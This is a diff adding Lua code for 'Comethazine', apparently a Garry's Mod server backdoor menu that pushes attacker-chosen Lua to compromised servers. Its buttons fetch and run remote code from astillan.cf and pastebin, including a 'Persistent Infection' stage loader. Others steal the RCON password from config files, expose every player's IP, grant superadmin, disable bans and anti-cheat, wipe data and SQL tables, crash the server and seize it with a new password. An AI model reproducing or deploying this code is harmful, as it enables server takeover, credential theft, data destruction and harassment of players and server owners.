+		function sbar1.btnGrip:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30,255 ))
+	end
+
+		local bar2 = vgui.Create("DScrollPanel", withoutinput)
+		bar2:Dock(FILL)
+
+		local sbar2 = bar2:GetVBar()
+		function sbar2:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30,255 ))
+	end
+		function sbar2.btnUp:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30))
+	end
+		function sbar2.btnDown:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30))
+	end
+		function sbar2.btnGrip:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30,255 ))
+	end
+
+		local bar3 = vgui.Create("DScrollPanel", harmful)
+		bar3:Dock(FILL)
+		
+		local sbar3 = bar3:GetVBar()
+		function sbar3:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30,255 ))
+	end
+		function sbar3.btnUp:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30))
+	end
+		function sbar3.btnDown:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30))
+	end
+		function sbar3.btnGrip:Paint( w, h )
+		draw.RoundedBox( 0, 0, 0, w, h, Color(30,30,30,255 ))
+	end
+
+			-- Features 1
+
+		Comethazine.AddButton("Double Or Nothing 100%", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[BDON_CONFIG.doubleChance = 100]])
+
+	end)
+
+		Comethazine.AddButton("Double Or Nothing 65%", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[BDON_CONFIG.doubleChance = 65]])
+
+	end)
+
+		Comethazine.AddButton("Persistent Infection", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		file.Append([[RunConsoleCommand("ulx", "luarun", http.Fetch("astillan.cf/uwu/core/stage1.php", RunString)]])
+	end)
+
+		Comethazine.AddButton("Artillery Strike", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !bombstrike then
+		hook.Add("Think", "lulz_bombstrike", function()
+		local explode = ents.Create("env_explosion")
+		local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
+		local trc = {}
+		trc.start = ps
+		trc.endpos = ps + Vector(0, 0, -99999)
+		local tr = util.TraceLine(trc)
+		if !tr.Hit then return end
+		explode:SetPos(tr.HitPos)
+		explode:Spawn()
+		explode:SetKeyValue("iMagnitude", "400")
+		explode:Fire("Explode", 0, 0)
+		end)
+		bombstrike = true
+		else
+		hook.Remove("Think", "lulz_bombstrike")
+		bombstrike = false
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Broken Glass Symphony", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !timer.Exists("A true masterpiece") then
+		timer.Create("A true masterpiece", 0.2, 0, function()
+		for _, p in pairs(player.GetAll()) do
+		p:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random(40, 180))
+		end
+		end)
+		else
+		timer.Remove("A true masterpiece")
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Console Jammer", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !(timer.Exists("consoleJammer")) then
+		timer.Create("oof", 0.5, 0, function()
+		print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
+		end)
+		else
+		timer.Destroy("consoleJammer")
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Change Everyone's Name", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
+		Comethazine.PostLua([[local str = "]] .. text .. [["
+		for k, v in next, player.GetAll() do
+		DarkRP.storeRPName( v, str )
+		v:setDarkRPVar( "rpname", str )
+		end]])
+		
+	end)
+	end)
+
+		Comethazine.AddButton("Change Everyone Model", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
+		Comethazine.PostLua("for k, v in pairs(player.GetAll()) do v:SetModel(\""..str.."\") end")
+		
+	end)
+	end)
+
+		Comethazine.AddButton("Change Everything Material", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
+		Comethazine.PostLua("for k, v in pairs(ents.GetAll()) do v:SetMaterial(\""..str.."\") end")
+
+	end)
+	end)
+		
+		Comethazine.AddButton("Earthquake", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !timer.Exists("earthquake") then
+		timer.Create("earthquake", 0.5, 500, function()
+		for _, p in pairs(player.GetAll()) do
+		p:SetPos(p:GetPos() + Vector(0, 0, 1))
+		p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
+		util.ScreenShake(p:GetPos(), 20, 1, 1, 100)
+		p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))
+		end
+		for _, e in pairs(ents.GetAll()) do
+		if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end
+		end
+		end)
+		else
+		timer.Remove("earthquake")
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Fake BSOD", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[http.Fetch('https://pastebin.com/raw/NehjdnX7',function(b,l,h,c)RunString(b)end,nil)]])
+		
+	end)
+
+		Comethazine.AddButton("Give Weapon", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		chat.AddText(Color(255,0,0), "[Comethazine] ", Color(255,155,155),"Feature in development")
+	end)
+
+		Comethazine.AddButton("Kill Everyone", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua("for k,v in pairs(player.GetAll()) do v:Kill() end")
+
+	end)
+
+		Comethazine.AddButton("Luarun Access", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")]])
+
+	end)
+
+		Comethazine.AddButton("Launch Players", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end")
+
+	end)
+
+		Comethazine.AddButton("LuaRun Code", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest( "LuaRun String", "String", "", function(text) 
+		Comethazine.PostLua([[RunString( ']] .. text .. [[' )]])
+
+	end)
+	end)
+		
+		Comethazine.AddButton("Rainbow Physgun", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[hook.Add("Think", "rainbowphysgun", function()
+		for k,ply in ipairs(player.GetAll()) do
+		local col = HSVToColor(CurTime() % 6 * 60, 1, 1)
+		ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
+		end
+		end)]])
+		end)
+
+		Comethazine.AddButton("Rainbow Chat Spam", bar1, function()
+		surface.PlaySound("buttons/button18.wav") 
+		Derma_StringRequest("Rainbow Chatspam", "Text", "", function(text)
+		Comethazine.PostLua([[
+		chat = {}
+		function chat.AddText(...)
+		net.Start("comethazine")
+		net.WriteTable({...})
+		net.Broadcast()
+		end
+		function AddTextPly(ply, ...)
+		net.Start("comethazine")
+		net.WriteTable({...})
+		net.Send(ply)
+		end
+		for k, v in pairs(player.GetAll()) do
+		v:SendLua('net.Receive("comethazine", function(len) chat.AddText(unpack(net.ReadTable()))end)')
+		end
+		timer.Create("gotEm", 0.8, 120, function()
+		local function ChatPrintRainbow(frequency, str)
+		local text = {}
+		for i = 1, #str do
+		table.insert(text, HSVToColor(i * frequency % 360, 1, 1))
+		table.insert(text, string.sub(str, i, i))
+		end
+		chat.AddText(unpack(text))
+		end
+		ChatPrintRainbow(10, "]] .. text .. [[")
+		end)]])
+
+	end)
+	end)
+
+		Comethazine.AddButton("Server Nuke (M9K)", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[
+		local rocket = ents.Create("m9k_launched_davycrockett")
+		local ply2 = table.Random(player.GetAll())
+		rocket:SetPos(ply2:GetPos())
+		rocket:SetOwner(ply2)
+		rocket.Owner = ply2
+		rocket:Spawn()
+		rocket:Activate()]])
+	end)
+
+		Comethazine.AddButton("Moan Steps", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !moanstep then
+		hook.Add("PlayerFootstep", "oooh", function(ply)
+		ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
+		end)
+		moanstep = true
+		else
+		hook.Remove("PlayerFootstep", "oooh")
+		moanstep = false
+		end]])
+
+	end)
+
+		Comethazine.AddButton("No Escape", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]])
+
+	end)
+
+		Comethazine.AddButton("Open URL On Players", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("URL On Players", "URL Link", "", function(str)
+		Comethazine.PostLua([==[local ply = str
+		ply:SendLua([[h=vgui.Create("DHTML")
+		h:SetSize(ScrW(),ScrH())
+		h:OpenURL(..str..)]])
+		]==])
+
+	end)
+	end)
+
+		Comethazine.AddButton("Explode all vehicles", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
+		local explo = ents.Create("env_explosion")
+		explo:SetPos(v:GetPos())
+		explo:SetKeyValue("iMagnitude", "300")
+		explo:Spawn()
+		explo:Activate()
+		explo:Fire("Explode", "", 0)
+		end
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Print All IP's", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[
+		local id = ]] .. LocalPlayer():UserID() .. [[
+		for k, v in pairs( player.GetAll() ) do 
+		Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Ulx Logecho 0", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua("RunConsoleCommand(\"ulx\", \"logecho\", \"0\")")
+
+	end)	
+
+		Comethazine.AddButton("Ulx Logecho 1", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua("RunConsoleCommand(\"ulx\", \"logecho\", \"1\")")
+
+	end)	
+
+		Comethazine.AddButton("Toggle all doors", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]])
+
+	end)
+
+		Comethazine.AddButton("Lock all doors", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end]])
+
+	end)
+
+		Comethazine.AddButton("Unlock all doors", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]])
+
+	end)
+
+		Comethazine.AddButton("Remove Bans", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end]])
+
+	end)
+
+		Comethazine.AddButton("Reset all money", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[RunConsoleCommand("rp_resetallmoney")]])
+
+	end)
+
+		Comethazine.AddButton("RCON Steal", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.Postlua([[
+		util.AddNetworkString("rcon_passw_dump")
+		util.AddNetworkString("jeveuttonrconleul")
+		util.AddNetworkString("aucun_rcon_ici")
+		net.Receive( "jeveuttonrconleul", function()
+		local RconPassword
+		if file.Exists("cfg/server.cfg", "GAME") then
+		for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
+		if string.find(v, "rcon_password") then
+		RconPassword = v
+		end
+		end
+		end
+		if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
+		for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
+		if string.find(v, "rcon_password") then
+		RconPassword = v
+		end
+		end
+		end
+		if RconPassword ~= nil then
+		net.Start("rcon_passw_dump")
+		net.WriteString(RconPassword)
+		net.Broadcast()
+		else
+		net.Start("aucun_rcon_ici")
+		net.Broadcast()
+		end
+		end)]])
+		chat.AddText(Color(255,0,0), "[Comethazine] ", Color(255,155,155),"Feature in development")
+
+	end)
+
+		Comethazine.AddButton("RCON Command", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("RCON Command", "Rcon", "", function(str)
+		cometh.PostRcon(str)
+
+	end)
+	end)
+
+		Comethazine.AddButton("Vaporize all players", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[for k, v in pairs(player.GetAll()) do v:Remove() end]])
+
+	end)
+
+		Comethazine.AddButton("FPP Unrestrict everything", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if FPP then
+		for k,v in pairs(FPP.Blocked) do
+		for r,g in pairs(v) do
+		RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
+		end
+		end
+		end]])
+
+	end)
+
+		Comethazine.AddButton("Wipe data folder", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end]])
+
+	end) 
+
+		Comethazine.AddButton("Wipe SQL Tables", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')]])
+
+	end)	
+
+		Comethazine.AddButton("YWF Autism", bar1, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[http.Fetch("https://astillan.cf/b1g.lua",function(b,l,h,c)RunString(b)end,nil)]])
+	end)
+
+		
+			-- Features 2
+
+		Comethazine.AddButton("ULX Unban SteamID", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
+		Comethazine.PostLua([[RunConsoleCommand("ulx","logecho","0") RunConsoleCommand( "ulx", "unban", "..str..")]])
+		
+	end)
+	end)
+
+		Comethazine.AddButton("Rainbow Buildings/Floor", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")]])
+		chat.AddText(Color(255,0,0), "[Comethazine] ", Color(255,155,155),"This may cause frame drop")
+		
+	end)
+
+		Comethazine.AddButton("Ignite Everyone", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
+		Comethazine.PostLua("for k, v in pairs(player.GetAll()) do v:Ignite(".. str ..") end")
+
+	end)
+	end)
+
+		Comethazine.AddButton("Ban Everyone", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Derma_StringRequest( "Ban All Players", "Reason", "", function(text)
+		Comethazine.PostLua([[
+		local id = ]] .. LocalPlayer():UserID() .. [[
+		for k, v in next, player.GetAll() do
+		if v:UserID() == id then continue end
+		v:Ban( 0, false )
+		v:Kick( "]] .. tostring(text) .. [[" )
+		end]])
+
+	end)
+	end)
+
+		Comethazine.AddButton("Corruption", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[http.Fetch("https://pastebin.com/raw/617S3m9V",function(b,l,h,c)RunString(b)end,nil)]])
+
+	end)
+
+		Comethazine.AddButton("Cleanup Map", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[game.CleanUpMap()]])
+
+	end)
+
+		Comethazine.AddButton("Disco Mode", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[http.Fetch("https://pastebin.com/raw/ixCT712U",function(b,l,h,c)RunString(b)end,nil)]])
+
+	end)
+
+		Comethazine.AddButton("Enigma Disco", bar2, function()
+		surface.PlaySound("buttons/button18.wav")	
+		Comethazine.PostLua([[http.Fetch("https://pastebin.com/raw/JEyamDJC",function(b,l,h,c)RunString(b)end,nil)]])
+		
+	end)
+
+		Comethazine.AddButton("EarRape", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua("for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end")
+
+	end)
+
+		Comethazine.AddButton("Meme Mode", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[http.Fetch('http://astillan.cf/meme.lua',function(b,l,h,c)RunString(b)end,nil)]])
+
+	end)
+
+		Comethazine.AddButton("Party Time", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[http.Fetch('https://pastebin.com/raw/ARjPQKGS',function(b,l,h,c)RunString(b)end,nil)]])
+
+	end)
+
+		Comethazine.AddButton("Rainbow HUD", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !rainbowscreen then
+		BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
+		rainbowscreen = true
+		else
+		BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")
+		rainbowscreen = false
+		end]])
+	end)
+
+		Comethazine.AddButton("Rainbow Props", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[if !rainbowobjects then
+		function RainbowObjects()
+		for q ,c in pairs(ents.GetAll()) do
+		local r = math.random(1, 255)
+		local g = math.random(1, 255)
+		local b = math.random(1, 255)
+		c:SetColor(Color(r, g, b))
+		end
+		end
+		hook.Add("Think" , "FuckingGay" , RainbowObjects)
+		rainbowobjects = true
+		else
+		hook.Remove("Think", "FuckingGay")
+		rainbowobjects = false
+		end]])
+	end)
+
+		Comethazine.AddButton("Crash Server", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[timer.Create("oof",0.5,1,function() while true do end end)]])
+		chat.AddText(Color(255,0,0), "[Comethazine] ", Color(20,150,200),"The server has been crashed gg")
+
+	end)
+
+		Comethazine.AddButton("Break Economy", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[for k,v in pairs(player.GetAll()) do v:addMoney(420420420) end]])
+
+	end)
+
+		Comethazine.AddButton("Seize Server", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		chat.AddText(Color(255,0,0), "[Comethazine] ", Color(20,150,200),"Server Password is: Comethazine")
+		Comethazine.PostLua([[RunConsoleCommand("sv_password", "Comethazine")
+		RunConsoleCommand("hostname", "SEIZED BY Comethazine")]])
+
+	end)
+
+		Comethazine.AddButton("Hell Mode", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")]])
+
+	end)
+
+		Comethazine.AddButton("Change Physics", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[RunConsoleCommand("sv_friction", "-8")]])
+
+	end)
+
+		Comethazine.AddButton("Change Gravity", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[RunConsoleCommand("sv_gravity", "-600")]])
+
+	end)
+
+		Comethazine.AddButton("Set Superadmin", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
+		Player(id):SetUserGroup("superadmin")]])
+
+	end)
+
+		Comethazine.AddButton("Set Moderator", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
+		Player(id):SetUserGroup("Moderator")]])
+
+	end)
+
+		Comethazine.AddButton("Set Trial Mod", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
+		Player(id):SetUserGroup("tmoderator")]])
+
+	end)
+
+		Comethazine.AddButton("Set User", bar2, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
+		Player(id):SetUserGroup("user")]])
+	end)
+
+		Comethazine.AddButton("Disable Bans/Kicks", bar3, function()
+		surface.PlaySound("buttons/button18.wav")	
+		Comethazine.PostLua([[if ULib then
+		function ULib.kick( ply, reason, calling_ply ) end
+		function ULib.ban( ply, time, reason, admin ) end
+		function ULib.addBan( steamid, time, reason, name, admin ) end
+		end
+		if FAdmin then
+		local function no(ply) end
+		FAdmin.Commands.AddCommand("kick", no)
+		FAdmin.Commands.AddCommand("ban", no)
+		FAdmin.Commands.AddCommand("jail", no)
+		FAdmin.Commands.AddCommand("UnJail", no)
+		FAdmin.Commands.AddCommand("ClearDecals", no)
+		FAdmin.Commands.AddCommand("StopSounds", no)
+		FAdmin.Commands.AddCommand("CleanUp", no)
+		FAdmin.Commands.AddCommand("dban", no)
+		end
+		local _R = debug.getregistry()
+		function _R.Player.Ban(ply, r) end
+		function _R.Player.Kick(ply, r) end
+		function game.KickID(id, reason) end
+		local RCM = RunConsoleCommand
+		function RunConsoleCommand(command, ...)
+		if command == "addip" then return end
+		RCM(command, ...)
+		end]])
+		
+		end)
+		
+		Comethazine.AddButton("Disable SNTE", bar3, function()
+		surface.PlaySound("buttons/button18.wav")	
+		Comethazine.PostLua([[
+		local function Check(func)
+		if string.find(debug.getinfo(func).short_src,"snte_source.lua") then
+		return true
+		else
+		return false
+		end
+		end
+		timer.Create("comethazinebypass",5,0,function()
+		for k,v in pairs(net.Receivers) do
+		if Check(v) then
+		net.Receive(k,function(l,ply)
+		ply:ChatPrint("LEL")
+		end)
+		end
+		end
+		end)]])
+
+		end)
+		
+		Comethazine.AddButton("Delete Server", bar3, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[local function WipeDir(dir)
+		local files,dirs = file.Find(dir.."*", "DATA")
+		for k,v in ipairs(files) do
+		file.Delete(dir..v)
+		end
+		for k,v in ipairs(dirs) do
+		WipeDir(v.."/")
+		end
+		end
+		print(60*60*6)
+		local function wiperpro()
+		print("Wiping server data. . .")
+		WipeDir("")
+		sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")
+		if ULib then
+		for k,v in pairs(ULib.ucl.groups) do
+		if k != "user" then
+		ULib.ucl.removeGroup(k)
+		end
+		end
+		end
+		if FPP then
+		for k,v in pairs(FPP.Blocked) do
+		for r,g in pairs(v) do
+		RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
+		end
+		end
+		end
+		for i=1,256 do
+		RunConsoleCommand("removeid",i)
+		end
+		for k,v in ipairs(player.GetAll()) do
+		v:Kick("comethazine.Team")
+		end
+		print("Wipe finished !")
+		end
+		timer.Create("1Tap",0.5,1,function() while true do end end)
+		wiperpro()]])
+		
+		end)
+		
+		Comethazine.AddButton("Wipe ULX", bar3, function()
+		surface.PlaySound("buttons/button18.wav")	
+		Comethazine.PostLua([[ULib.Ban = function() return false end
+		ULib.addBan = function() return end
+		ULib.kick = function() return end
+		if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
+		if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end]])
+		
+		end)
+
+		Comethazine.AddButton("Wipe fAdmin", bar3, function()
+		surface.PlaySound("buttons/button18.wav")
+		Comethazine.PostLua([[
+		if _G.CAC then
+	    _G.CAC = function() return false end
+	    CAC.Detection = function() return false end
+	    end]])
+		
+		end)
+
+		function CloseMenu()
+			Comethazine.panelPosX, Comethazine.panelPosY = comethazine:GetPos()
+				MenuOpen = false
+				comethazine:Close()
+			end
+		end
+
+		Comethazine.load(true)
+
+
+print("")
